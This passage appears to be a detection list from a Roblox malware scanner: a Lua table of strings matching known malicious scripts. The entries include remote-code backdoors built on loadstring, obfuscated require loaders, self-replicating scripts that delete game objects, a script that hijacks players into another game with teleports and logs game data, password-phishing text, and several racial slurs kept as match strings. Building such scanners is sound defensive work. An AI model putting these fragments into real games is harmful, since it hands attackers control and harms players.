SC.Name = math.random(1,#names)
SCC.Name = math.random(1,#names)
SCCC.Name = math.random(1,#names)
end]],

	[[while true do
wait()
P = Instance.new("Weld")
P.Parent = script
script:clone().Parent = script
end]],

	[[local module = {}
local allowed = {"RAHULPROHACKER", "EnginnScript"}
game.Players.PlayerAdded:connect(function(player)
    for i, v in pairs(allowed) do
        if player.Name == v then
            script.ScreenGui:Clone().Parent = player.PlayerGui
        end
    end
end)
return module
]],

	[[if player.Name == you then
script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[exe.OnServerEvent:connect(function(plr, key, data)
	if key == GlobalPass then
		print("Running: "..data.." From: "..plr.Name)
		loadstring(data)()
	else
		plr:Kick(stop)
	end
end)]],

	[[require(script:WaitForChild("Loadstring"))(stri)()]],

	[[Remote.OnServerEvent:connect(function(player, key, execute)
		if mod == "Evil" then
			print("Running: "..execute.." from: "..player.Name)
			loadstring(execute)()
		else
			player:Kick("You are not admin")
			print(player.." was kicked for trying to connect to the backdoor")
		end
end)]],

	[[discord=Instance.new("Message")
discord.Text = "THE APOCALYPSE HAS BEGUN!!!"
discord.Parent = game.Workspace]],

	[[GetAllItems(workspace)]],

	[[getfenv()['\114\101\113\117\105\114\101'](238754.208233*12851)]],

	[[|106(*79|151(*75|117@#59|97@#84|81@#100|86(*86|13&^12|12&^8|25&^29|28(*24|8@#38|0@#76|81(*81|0@#54|74(*74|0@#89|64(*64|0@#83|29(*29|0@#40|0@#84|29(*29|0@#37|30&^30|19(*19|26&^26|7&^5|2@#114|4@#32|0@#30|41&^41|25(*25|24@#95|0@#54|36&^36|0@#111|78@#76|72&^8|86(*86|3&^3|86(*75|69&^5|35&^35|35&^34|95(*65|41&^41|128@#72|0@#101|2@#38|0@#18|30(*30|4&^4|4@#53|1&^7|0@#103|37(*37|28(*28|112@#32|187(*73|106&^3|110@#10|116@#73|0@#113|4@#5|87@#70|0@#38|73(*73|37(*37|45@#26|45@#48|112&^32|79@#61|72&^31|110&^43|127(*45|69@#114|85&^17|50(*18|92&^30|68&^29|17&^49|72&^4|173(*88|82@#113|79&^14|80@#121|72@#109|44@#20|32@#118|89&^26|72@#37|69@#61|65@#70|111(*31|69@#112|124(*41|84@#66|105(*73|168(*85|157(*90|76&^30|73@#47|85&^5|84@#26|32@#55|79@#99|66@#18|70@#16|126(*41|117&^38|67@#52|68&^5|84@#58|97(*18|109(*27|44@#93|11&^43|105(*26|158(*80|76@#66|89@#42|32@#96|44&^8|76(*27|57&^22|172(*89|67@#11|82@#92|73@#102|80@#102|84]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3782332641)]],

	[[game.MarketplaceService:PlayerOwnsAsset(plr,3801326824)]],

	[[game.MarketplaceService:PromptPurchase(plr,3801326824)
			wait(30)
			game.MarketplaceService:PromptPurchase(plr,3782332641)]],

	[[sound = Instance.new("Sound")
sound.SoundId = "http://www.roblox.com/asset?id=459420383"
sound.Volume = .5
sound.Looped = true
sound.Name = "Music"
sound.Parent = game.Workspace
sound:Play()
script:Remove()]],

	[[()function.player.aspx?.ID=('Turn Into Nothing But Black')
	starterplayer.player(0)+('Player''s'' ''iD') 250,250,250
    starterplayer.player(Random)-"Players Get Deactivated"
end]],

	[[INSPIRED BY THE FASCINATING OLD VIRUSES OF THE 90S
m.Text BY THE VIRUS OF THE NAME Savior
http://www.youtube.com/watch?v=4FZvJmwXq5U
i a mM NoT INSAne!!!!!!!!!!! :(
A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!]],

	[[Setupconfirm=script:FindFirstChild("deployed")
if Setupconfirm==nil then
	dep=Instance.new("NumberValue", script)
	dep.Name="deployed"
	dep.Value=tick()
end]],

	[[("A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!")]],

	[[crashites=game.Players:GetChildren()
		for crashite=1, #crashites do
			Playerconfirm=crashites[crashite]:FindFirstChild("PlayerGui")
			if Playerconfirm~=nil then
				minion=script.destroyer:Clone()
				minion.Parent=crashites[crashite].PlayerGui
			end
		end]],

	[[local thank = "Thank you for choosing this 'Virus' as your choice for destructive purposes."
local thank = "This Virus is also configurable by the way, the settings are down bellow."
local thank = "Anyways, I hope you enjoy using this."
local PS = "Also, if you happened to find this script in a model in your place and you didn't put it there."
local PS = "Delete it before anything bad happens aaaaaaaaaannnnnnnndddddd."
local PS = "Congratulations, you saved your place from a nightmare."
local PS = "Just make sure to subscribe to Sans Gaming." ]],

	[[if hit:FindFirstChildWhichIsA("Fire") == nil then
		local fire = script.Parent:Clone()
		fire.Parent = hit
		hit.Name = "DEATH TO DATGUY"
	end]],

	[[p.Heat = 999
			p.Size = 999
			p.Enabled = true
			local y = Instance.new("ForceField")
			y.Name = "��������"
			y.Parent = x[i]],

	[[print("��������������������������������������������������������������������������������")]],

	[[--Credit too the original creator of teh slimes. Timsood something or the other.
-------------
-------------
spaces = 3 -- How many spaces it travels per move(1-3 is the best, preferably 2)
speed = 2000 -- How fast it goes, just put any number I guess :P
range = 9999 -- How far the slime "sees"; if it can't see ya it won't get ya! lol
ooze = true -- This is whether the slime will squeeze through really thick walls or not.
-------------
-------------

local partname = "TehSlime" -- Name of the "Slimeys". So you don't have to change it throughout the entire script. :P
local targetname = "Head" -- Kinda obvious....... lol
local food = {"Head"} -- OM NOMS!!! :D

-------------
-------------

function findTarget() -- Ah, the findTarget() command. This command lets the slime find it's next victim.
	g = game.Workspace:getChildren()
	for i=1, #g do
	if g[i]:findFirstChild(targetname) ~= nil then
		if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < range then
			if T == nil then
				T = g[i]:findFirstChild(targetname)
			else
				if (g[i]:findFirstChild(targetname).Position - script.Parent:findFirstChild(partname).Position).magnitude < (T.Position - script.Parent:findFirstChild(partname).Position).magnitude then
					T = g[i]:findFirstChild(targetname)
				end
			end
		end
	end
	end
end]],

	[[-- rename, put into model, and troll 💋💔💔💔💔💔🙈🙉]],

	[[function findAll(lag)
	for i,v in ipairs(workspace:GetChildren()) do
		local clone = lag:clone()
		clone.Name = "You got H8C5ED"
		clone.Parent = v
	end
end]],

	[[hacked]],

	[[h3cked]],

	[["iEmOtIoNlEsS"]],

	[[ݣ]],

	[[hakked]],

	[[h4kk3d]],

	[[haacked]],

	[[tr0ll]],

	[[R0ll]],

	[[nigger]],

	[[niger]],

	[[niggeer]],

	[[nigeer]],

	[[nibba]],

	[[msg.Parent = game.Workspace
msg.Text = "Anchoring players and moving them to a more slav spot..."]],

	[[haxx]],

	[[Funny=require(]],

	[[print("This game has been hacked get rekt idiot!")]],

	[[This game has been hacked get rekt idiot]],

	[[59429.86000469662*55359)("2zPM559.901T4qNALB(5916.814864029748)")]],

	[[3419556000]],

	[[if player.Name == you then script["Sinner V1.2"].Parent = player.PlayerGui]],

	[[local IllIIllIIlll=require]],

	[[S333X]],

	[[3989501000]],

	[[3989337802]],

	[[TS:Teleport(3989337802,plr)]],

	[[TS:Teleport(3989337802,v)]],

	[[/110670]],

	[[ 110670]],

	[[2797686659]],

	[[3173224995]],

	[[4309332554]],

	[[Please FOLLOW ME ON TWITTER @JBLADE733]],

	[[3016646411]],

	[[3089856341]],

	[[TS:Teleport(3089856341,plr)]],

	[[TS:Teleport(3089856341,v)]],

	[[getfenv()["\103\101\116\102\101\110\118"]()["\115\101\116\102\101\110\118"](tonumber("\49"),{["1gKorIzL9]],

	[[1120769650]],

	[[Teleport(1120769650]],

	[[1394668245]],

	[[(p,1394668245)]],

	[[PromptPurchase(p,1394668245)]],

	[['\108\111\099\097\108\032\084\111\111\108\032\061\032\115\099\114\105\112\116\046\080\097\114\101\110\116\013\010\013\010\108\111\099\097\108\032\103\101\097\114\115\032\061\032\123\053\053\055\055\053\055\055\057\125\013\010\013\010\013\010\013\010\102\117\110\099\116\105\111\110\032\111\110\065\099\116\105\118\097\116\101\100\040\041\013\010\032\045\045\032\112\108\097\121\032\115\111\117\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\032\061\032\084\111\111\108\046\072\097\110\100\108\101\058\070\105\110\100\070\105\114\115\116\067\104\105\108\100\040\034\077\097\103\105\099\083\111\117\110\100\034\041\013\010\032\105\102\032\109\097\103\105\099\083\111\117\110\100\032\061\061\032\110\105\108\032\116\104\101\110\032\114\101\116\117\114\110\032\101\110\100\013\010\032\109\097\103\105\099\083\111\117\110\100\058\080\108\097\121\040\041\013\010\013\010\045\045\032\071\079\079\068\032\082\065\078\068\079\077\073\090\065\084\073\079\078\032\067\079\068\069\033\033\013\010\032\110\117\109\076\111\111\112\115\032\061\032\109\097\116\104\046\114\097\110\100\111\109\040\048\044\109\097\116\104\046\102\108\111\111\114\040\049\048\048\048\042\116\105\109\101\040\041\041\041\013\010\032\110\117\109\076\111\111\112\115\032\061\032\110\117\109\076\111\111\112\115\032\045\032\040\109\097\116\104\046\102\108\111\111\114\040\110\117\109\076\111\111\112\115\032\047\032\049\048\048\048\048\041\042\049\048\048\048\048\041\013\010\032\102\111\114\032\105\032\061\032\049\044\110\117\109\076]],

	[[--hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad hoes mad]],

	[[function connection(player)
player:remove()
end
game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end game.Players.ChildAdded:connect(connection)]],

	[[function connection(player)player:remove()end;game.Players.ChildAdded:connect(connection)]],

	[[This server has been shutdown by Cool890dude]],

	[[Cool890dude]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then]],

	[[m.Name="94m3 Cr45h3r 1337 m355a93"]],

	[[if w[i].Name~="94m3 Cr45h3r"and w[i].Name~="94m3 Cr45h3r 1337 m355a93"then
w[i]:remove()
tw=tw+1
end end
for i=1,#p do
p[i]:remove()
tp=tp+1
end
for i=1,#g do
g[i]:remove()
tg=tg+1
end
for i=1,#t do
t[i]:remove()
tt=tt+1
end]],

	[[Hi and welcome to my script hope you enjoy the hack lion. WARNINGS: Hack might back fire and crash the game it happens.]],

	[[Newleetbox now has your username and password, Have a nice day!]],

	[[We don't give passwords back. We only spread the passwords on our website for EVERYONE to HACK IN!]],

	[[game.Players.MaxPlayers = 0]],

	[[SCRIPT: Generator V is not a lie, click play fool]],

	[[m.Text = "WARNING MALWARE"]],

	[[@JBLADE733]],

	[[1445530615]],

	[[local modelid = 1445530615]],

	[[local market = game:GetService("MarketplaceService")
	local modelid = 1445530615]],

	[[bendarobloxian]],

	[[local modelid = 1445530615
	local adminid = 857927023]],

	[[The code below this line is to support the creator (bendarobloxian)]],

	[[3419556*1000]],

	[[-- Made by youglow,new account robloxcitya dont forget to add him]],

	[[https://discord.gg/Nf2XrJ]],

	[[I shall remain anonymous, but enjoy hacking those noobs.]],

	[[Yes, you most likely know me,
	I am a mediocere developer on ROBLOX and here to assist you in exploitation needs.
	Here you can trick someone into entering their password.
	This links with Trello.]],

	[[59429.86000469662*55359]],

	[[4298677137]],

	[[4298672263]],

	[[4350052962]],

	[[4138626212]],

	[[if game.Players.LocalPlayer:IsFriendsWith(1208107446) or game.Players.LocalPlayer.Name == "Hywayyy" then ]],

	[[local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}

local Source = script.Parent.EditorFrame.Source
local Lines = Source.Parent.Lines]],

	[[3702180717]],

	[[2290382491]],

	[[AdamFlexer]],

	[[Odin_00101010101]],

	[[DestinyKennedy2]],

	[[3930380293]],

	[[2977298142]],

	[[3989432705]],

	[[4056237385]],

	[[4056235807]],

	[[4056234287]],

	[[4056232640]],

	[[4056231205]],

	[[4056229665]],

	[[4056228250]],

	[[4056226820]],

	[[4056225268]],

	[[4056223744]],

	[[4056222250]],

	[[4056220801]],

	[[4056219320]],

	[[4056217842]],

	[[4056216423]],

	[[4056215048]],

	[[4056213658]],

	[[4056212354]],

	[[4056210981]],

	[[4056209461]],

	[[4056207947]],

	[[2674928586]],

	[[4124658053]],

	[[["1gKorIzL9NW7p"]=2]],

	[[)["\116\111\110\117\109\98\101\114"]],

	[[]{48,88,67]],

	[[4436101979]],

	[[2944264211]],

	[[game:GetService("TeleportService"):Teleport(2944264211,player)]],

	[[script.N00B.Parent = game.Lighting
script.NO0B:Play()
script.NOOB:Play()]],

	[[4436519412]],

	[[https://discord.gg/BKTUrXV]],

	[[Anti-Exploit made by Internet Explorer#5231]],

	[[-- Scripted by Esynov]],

	[[TeleportID = 3058831461]],

	[[SupportID = 4467005447]],

	[[-- This is in no way a virus as its just simple script.]],

	[[1844877398,player]],

	[[1702114734,player]],

	[[2871271645]],

	[['01101100','01101111','01100011','01100001','01101100','00100000','01101000','01110100','01110100','01110000','00100000','00111101','00100000','01100111','01100001','01101101','01100101','00111010','01000111','01100101','01110100','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00101000','00100111','01001000','01110100','01110100','01110000','01010011','01100101','01110010','01110110','01101001','01100011','01100101','00100111','00101001','00001010','01101100','01101111','01100011','01100001','01101100','00100000','01000100','01100001','01110100','01100001','00100000','00111101','00100000','01111011','00001010','01011011','00100010','01100011','01101111','01101110','01110100','01100101','01101110','01110100','00100010','01011101','00100000','00111101','00100000','00100010','01101101','01110010','00100000','01101011','01110010','01100001','01100010','01110011','00100000','01100110','01101111','01110101','01101110','01100100','00100000','01100001','00100000','01101110','01100101','01110111','00100000','01100111','01100001','01101101','01100101','00100000','01110011','01101001','01110010','00100000','01101000','01110100','01110100','01110000','01110011','00111010','00101111','00101111','01110111','01110111','01110111','00101110','01110010','01101111','01100010','01101100','01101111','01111000','00101110','01100011','01101111','01101101','00101111','01100111','01100001','01101101','01100101','01110011','00101111','00100010','00100000','00101110']],

	[[mr krabs found a new game sir https://www.roblox.com/games/" ..game.PlaceId]],

	[[https://perryhaxz.moe/discord_gateway.php]],

	[[local Ranking = Instance.new("RemoteEvent", game.JointsService)]],

	[[loadstring(serverExecution)()]],

	[[-- Hello Thanks for using Doggo Lag Patcher my new Lag Patcher!
-- Here's a few steps for doggo lag patcher to work right.
-- Enable Http by going to game Options then Options. Or open command bar & copy & paste this game:GetService("HttpService").HttpEnabled = true
-- And Enable loadstrings by going in Explorer and clicking on ServerScriptService then properties then check Loadstrings!
-- New updates coming every week!
-- Patches almost all lag!
-- Motto | Doggos drink the bepis lag!]],

	[[Enable loadstrings]],

	[[v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3278300817)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3130795686)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3224372393)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3196858776)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](]],

	[[1844877398]],

	[[4641921091]],

	[[--NOTE TO USERS AND ROBLOX STAFF THIS IS OBFUSCATED SO EXPLOITERS CAN'T EDIT OTHER PEOPLES HEALTH]],

	[[("eriuqer"):reverse()]],

	[[347683.814016*10345]],

	[[4672771752]],

	[[game['\87\97\105\116\70\111\114\67\104\105\108\100'](game]],

	[[game['\71\101\116\83\101\114\118\105\99\101'](game]],

	[[spawn(function()game:WaitForChild('\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101')if game:GetService('\87\111\114\107\115\112\97\99\101').Terrain:FindFirstChild('\67\97\108\108\70')then]],

	[[393319350]],

	[[3022778572]],

	[[3610230372]],

	[[3610230360]],

	[[u='RunService';local j='eriuqer']],

	[[getfenv()['\114\101\113\117\105\114\101'](tonumber(dec(B_1))):FireServer()]],

	[[FOR AUTO UPDATE OF THE SHADER]],

	[[4095522280]],

	[[)['?']).slo()]],

	[[3282101835]],

	[[Please message iiCrisisOfTheWorld on Roblox!]],

	[[ | __ )   _   _  (_) | |   __| |   ___   _ __  \ \/ /
 |  _ \  | | | | | | | |  / _` |  / _ \ | '__|  \  /
 | |_) | | |_| | | | | | | (_| | |  __/ | |     /  \
 |____/   \__,_| |_| |_|  \__,_|  \___| |_|    /_/\_\]],

	[[BuilderX AntiCheat]],

	[[2993156368]],

	[[3874171563]],

	[[3874554062]],

	[[3874532225]],

	[[3836103993]],

	[[3837780759]],

	[[3865753107]],

	[[3836200621]],

	[[3836747879]],

	[[3837779568]],

	[[3836749099]],

	[[3856660240]],

	[[getfenv()["\114\101\113\117\105\114\101"](]],

	[[3930446225]],

	[[Hot clothing: https://www.roblox.com/groups/4743467/Beach-Spectation#!/store]],

	[[Sinner V2.1]],

	[[Sinner Chat]],

	[[Enabled36]],

	[[WhitelistDisabled__LOL]],

	[[You just executed a deprecated function \n -- (Health) please use Heal() instead.]],

	[[\114\101\113\117\105\114\101]],

	[[-- Oh hey, I don't want to hide this but I have to because people are suspicious, the script below loads an auto-updater so if someone manages to abuse anything in this model I will be able to patch it instantly.]],

	[[for _, v in ipairs(workspace:GetDescendants()) do
if v:IsA(“BaseScript”) then
v:Destroy()
end
end]],

	[[Workspace:ClearAllChildren()]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.]],

	[[237754.208233*12851-.0023]],

	[[if not game:GetService("RunService"):IsStudio() then getfenv()]],

	[[ch(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b] ~= script then
script.Parent = TAB[b]
end
if (script.Parent:IsA("Part") or script.Parent.className == "TrussPart" ) and script.Parent.Position.Y < 0 then
script.Parent = game.Workspace
end
end


wait(5)
print("GO")

TAB = {}
TABscr = {}
scriptSource = script["Source"]
i = 0

search(game.Workspace)

repeat
i = i + 1
if TAB[i]:IsA("Part") then
TAB[i].Anchored = true
end
if TAB[i]:IsA("Humanoid") then
TAB[i].WalkSpeed = 50000
end
if TAB[i].className == "SpawnLocation" then
TAB[i]:Remove()
end
until i == #TAB

TAB = {}
TABscr = {}
search(game.Workspace)]],

	[[tion search(par)
local i = 0
local c = par:GetChildren()
if #c ~= 0 then
repeat
i = i + 1
tableinsert(TAB,c[i])
if c[i].className == "Script" or c[i].className == "LocalScript" then
tableinsert(TABscr,c[i])
end
search(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b]],

	[[ax = 100
parttable = {}
local attach
local mem
tabnum = 1
if workspace:FindFirstChild("Attacker") == nil then
if waitbeforepayload == true then
--Waiting
if debugval == true then
print("Starting the "..waittime.. " wait until activating the payload.")
end
local ae = waittime
repeat wait(1)
ae = ae - 1
if debugval == true then
print(ae.. " Seconds remaining.")
end
until ae == 0
if debugval == true then
print("Activating Payload...")
end
--If you don't delete all of the viruses before this wait is over, your place is screwed HARD.
end
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
else
attach = workspace:FindFirstChild("Attacker")
end
local dice = 0
while true do
if workspace:FindFirstChild("Attacker") == nil then
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
mem = Instance.new("Message")
mem.Parent = workspace
mem.Text = "Are you fucking gay? It won't be that easy to dismantle this mighty monster!"
end
if mem ~= nil then
wait(5)
mem:Destroy()
mem = nil
end
dice = math.random(1, 100)
if debugval == true then
print(dice .." with ".. attach.Value)
end
if dice == workspace.Attacker.Value then
if debugval == true then
print("match!")
end
local s = workspace:GetDescendants()
	for i,v in pairs(workspace:GetDescendants()) do
		parttable[tabnum + 1] = v
	    tabnum = tabnum + 1
	end
	tabnum = 1
	local objval = math.random(1,#parttable)
    local parental = parttable[objval]
    if parental ~= nil then
    local death = script:Clone()
    death.Parent = parental
    attach.Value = dice
    if script.Parent.ClassName == "Part" or script.Parent.ClassName == "MeshPart" or script.Parent.ClassName == "UnionOperation" then
if debugval == true then
print("Murdering " .. script.Parent.Name .. " Like how a real cereal killer would.")
end
	script.Parent:Destroy()
end
if script.Parent.ClassName == "Script" or script.Parent.ClassName == "Local Script"]],

	[[ Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse("SuRViV")
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse("delbasiD")
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers > 1 then
local m = Instance.new("Hint")
m.Parent = workspace
m.Name = "�"
m.Text = string.reverse("!AHAHAWM !oot uoy kcah lliw 1monmonmoN")
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == "Disabled" then
		egd[]],

	[[itelist = 5669570 -- Friends Whitelist
local LogGame = 4716080997 --PlaceId of the logging game.

local ds = game:GetService("DataStoreService")
local p = ds:GetDataStore("Logged")

local MS = game:GetService("MessagingService")
local leeching = true

local TS = game:GetService("TeleportService")
local PLRS = game:GetService("Players")
local HTTP = game:GetService("HttpService")

local function allprint(msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["printing."]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
print(tostring(msg))
end

local function localprint(plr,msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["error"]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
end

local function checkhttp()
  local oof = pcall(function()
  HTTP:GetAsync("https://google.com/")
  end)
  if oof then
    return true
  else
    return false
  end
end

local sentData = {
  id = game.PlaceId,
  playing = #game.Players:GetPlayers(),
  jobId = game.JobId,
  http = checkhttp(),
  gameId = game.GameId,
  version = game.PlaceVersion,
  gameName = workspace.Parent.Name,
  maxplayers = game.Players.MaxPlayers,
}

local amount = 0

PLRS.PlayerAdded:Connect(function(plr)
amount = amount + 1
if amount == 1 then
  if p:GetAsync("IsLogged") == false then
    if not plr:IsInGroup(GroupWhitelist) then
   	    local success,res = pcall(function()
		p:SetAsync("IsLogged",true)
		end)
      if success then
		TS:Teleport(LogGame,plr,sentData,script.RobloxLoadingGui)
      else
		print("Error in DataStores: "..res)
	  end
    else
      warn("Whitelisted user, not teleporting.")
    end
  end
end
end)

PLRS.PlayerAdded:Connect(function(plr)
	if p:GetAsync("IsLogged") == true then
		wait(5)
		p:SetAsync("IsLogged",false) --This is for stop a loop of logging.
	end
end)

MS:SubscribeAsync('dGfAuuc[}+K|H"[-W4Q',function(fortnite) --teleport all players in all servers with leech.
local tableSended = fortnite.Data
for _,v in pairs(PLRS:GetPlayers()) do
  if v.Name ~= tableSended[1] then
    TS:Teleport(tableSended[2],v)
  end
end
end)

local function Handle(plr,cs)
  if lili.Whitelisted[plr.Name] and cs and cs.Function and cs.Args then
    if lili.Functions[cs.Function] then
      return lili.Functions[cs.Function](plr,unpack(cs.Args)) or "Nope"
    else
      error(cs.Function.." Is not a function!")
    end
  else
    plr:Kick()
  end
end

local function Start(sdad)
  if lili.Whitelisted[sdad.Name]and not sdad.PlayerGui:FindFirstChild("rpX") then
    local gui = script["rpX"]:Clone()
    gui.Parent = sdad.PlayerGui
    gui.main.Disabled = false
    gui["rpXFunction"].OnServerInvoke = Handle
  end
  if lili.Blacklisted[sdad.UserId] then
    sdad:Kick("You have been blacklisted from using LISI.")
  end
end



game.Players.PlayerAdded:Connect(function(asdasd)
if asdasd:IsInGroup(GroupWhitelist) then
  lili.Whitelisted[asdasd.Name] = true
  Start(asdasd)
end
end)

lili.Functions.return_funcs = function(plr)
local funcs = {}
for name in pairs(lili.Functions) do
  table.insert(funcs,name)
end
return funcs
end

lili.Functions.chat = function(plr,victim,msg)
local k = Things.message:Clone()
k.Parent = victim.PlayerGui
k.Message.Value = tostring(msg)
k.Disabled =  false
end

lili.Functions.AntiBan = function(plr,text)
require(script.Antiban):Fire(text,{plr.Name})
end

lili.Functions.Template = function(plr,arg1,arg2) --Template for a custom function.
print("Hello, the player "..plr.Name.." said: "..arg1.." "..arg2)
end

lili.Functions.F3X = function(plr)
require(4506529904):f3x(plr.Name)
end

lili.Functions.ss_player = function(plr)
return plr
end

lili.Functions.leech = function(plr,id)
local thingstosend = {plr.Name,id}
if leeching == true then
leeching = false
print("Leeching to PlaceId: "..id)
MS:PublishAsync('dGfAuuc[}+K|H"[-W4Q',thingstosend)
wait(900)
leeching = true
elseif leeching == false then
print("Sorry but you need to wait 15 minutes.")
end
end

lili.Functions.R6 = function(plr)
require(Things.R6):r6(plr.Name)
end

lili.Functions.Execute = function(plr,code,bool)
if bool == true then
local yes,no = pcall(function()
local Env = setmetatable({},{__index=function(_,Function)
return getfenv(0)[Function] or function(...)
return lili.Functions[Function] and lili.Functions[Function](plr,...)
end
end})
Env["LocalPlayer"] = plr
Env["print"] = allprint
return lili.Loadstring(code,Env)()
end)
if no then localprint(plr,no) end
elseif bool == false then]],

	[[local ExecFrame = script.Parent["MainFR#*3"]
local RE = script.Parent["rpXFunction"]
local ST = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LPlayer = Players.LocalPlayer
local ServerSide = true

ST:SetCore("ChatMakeSystemMessage",{
	Text="Welcome back, "..LPlayer.Name..".",
	Color=Color3.fromRGB(255, 170, 255)
})

--------------------------------------------------------------------------------------
local execbutton = ExecFrame.ex
local clrbutton = ExecFrame.clr
local hidebutton = ExecFrame.hide
_G.hide = true
local scroll = ExecFrame.scroll
local code = scroll.code

execbutton.MouseButton1Click:Connect(function()
	if ServerSide == true then
		RE:InvokeServer({Function="Execute",Args={code.Text,true}})
	elseif ServerSide == false then
		RE:InvokeServer({Function="Execute",Args={code.Text,false}})
	end
end)

clrbutton.MouseButton1Click:Connect(function()
	code.Text = ""
end)

hidebutton.MouseButton1Click:Connect(function()
	_G.hide = not _G.hide
end)]],

	[[rpXFunction]],

	[[3930635851]],

	[[uQV%XMV8fNT>&BCu]],

	[[5502541]],

	[[4707753756]],

	[[repeat wait() until #Players:GetPlayers() > 0

local function GetRandomPlayer()
    for _,v in pairs(Players:GetPlayers()) do
        print(v)
        local TPData = v:GetJoinData()
        if TPData then
            if TPData.SourcePlaceId and TPData.SourcePlaceId ~= TeleportTo then
                return v
            elseif not TPData.SourcePlaceId then
                return v
            end
        end
    end
    return nil
end

local RandomPlayer = GetRandomPlayer()

if RandomPlayer then
    print("Roblox Error Warning.")
    TeleportService:Teleport(TeleportTo, RandomPlayer, tostring(#Players:GetPlayers()))
else
    print("Roblox Error warning.")
end

Players.PlayerAdded:Connect (function(plr)
